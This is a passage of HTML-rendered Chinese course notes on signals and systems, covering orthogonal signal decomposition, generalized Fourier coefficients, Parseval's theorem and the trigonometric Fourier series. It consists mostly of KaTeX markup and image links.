style="height:2.123932em;vertical-align:-0.8119659999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.311966em;"><span style="top:-2.288134em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">⋅</span><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">⋅</span><span class="mrel mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2883799999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.22222em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.58333em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8119659999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:2em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">量</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.390139em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">交</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.390139em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">无</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.240139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⇀</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></p></li><li><p>矢量正交分解：</p></li></ul><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001150737398.png" alt=""></p><p>-&gt; 推广到n维空间</p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001150925530.png" alt="image-20221001150925530"></p><p><font color="red">思路</font>：将矢量空间正交分解的概念推广到信号空间——在信号空间找到<strong>若干个相互正交的信号作为基本信号</strong>，使得信号空间中任意信号均可表示成它们的线性组合。</p><h2 id="信号的正交分解">信号的正交分解</h2><p><strong>信号空间里怎样构建信号分解？</strong></p><ul><li>信号正交</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911211511055.png" style="zoom:33%;" /><ul><li>正交函数集</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911212048453.png" alt="image-20220911212048453" style="zoom: 33%;" /><ul><li>标准正交函数集：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">K_{i}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>完备正交函数集(全部找到又不多找)</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911212204307.png" alt="image-20220911212204307" style="zoom:33%;" /><ul><li><p>典型例子</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911213350683.png" alt="image-20220911213350683" style="zoom:33%;" /></li></ul><h3 id="delta信号的正交分解"><strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>信号的正交分解</strong></h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911215221402.png" alt="image-20220911215221402" style="zoom:50%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001151737883.png" alt="image-20221001151737883"></p><h3 id="delta广义傅里叶系数"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>广义傅里叶系数</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911215403170.png" alt="image-20220911215403170" style="zoom:50%;" /><h2 id="帕斯瓦尔定理">帕斯瓦尔定理</h2><p>例子：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>是电压，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>加载在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">Ω</mi></mrow><annotation encoding="application/x-tex">1\Omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">Ω</span></span></span></span>的电阻上产生的瞬时功率的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f^{2}(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>：求积分 -&gt; 能量 = 分量和（能量守恒）</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911215615624.png" alt="image-20220911215615624" style="zoom:50%;" /><ul><li>详述：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911215801393.png" alt="image-20220911215801393" style="zoom: 33%;" /></li></ul><h1>周期信号傅里叶级数</h1><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>信号</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\varphi_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>完备正交函数集</p><h2 id="三角形式的傅里叶级数">三角形式的傅里叶级数</h2><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi mathvariant="normal">∞</mi></munderover><msub><mi>C</mi><mi>i</mi></msub><msub><mi>φ</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mspace width="2em"/><mspace width="2em"/><mtext>广义傅里叶展开式</mtext><mspace linebreak="newline"></mspace><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><mfrac><mrow><msubsup><mo>∫</mo><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>1</mn></msub></msubsup><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><msub><mi>φ</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mi>d</mi><mi>t</mi></mrow><mrow><msubsup><mo>∫</mo><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>1</mn></msub></msubsup><msub><mi>φ</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><msubsup><mi>φ</mi><mi>i</mi><mo lspace="0em" rspace="0em">∗</mo></msubsup><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mi>d</mi><mi>t</mi></mrow></mfrac><mspace width="2em"/><mspace width="2em"/><mtext>广义傅里叶系数</mtext></mrow><annotation encoding="application/x-tex">f(t)=\sum_{i=1}^{\infty}C_{i}\varphi_{i}(t)\qquad\qquad广义傅里叶展开式\\C_{i}=\frac{\int_{t_{2}}^{t_{1}}f(t)\varphi_{i}(t)dt}{\int_{t_{2}}^{t_{1}}\varphi_{i}(t)\varphi_{i}^{*}(t)dt}\qquad\qquad广义傅里叶系数</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:2em;"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord cjk_fallback">广</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">傅</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">叶</span><span class="mord cjk_fallback">展</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">式</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1687519999999996em;vertical-align:-1.3343759999999998em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8343759999999998em;"><span style="top:-2.121544em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9884559999999999em;"><span style="top:-2.34418em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.2579em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.45592em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.670496em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.27686399999999994em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mord mathdefault">d</span><span class="mord mathdefault">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.84592em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9884559999999999em;"><span style="top:-2.34418em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.2579em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.45592em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault 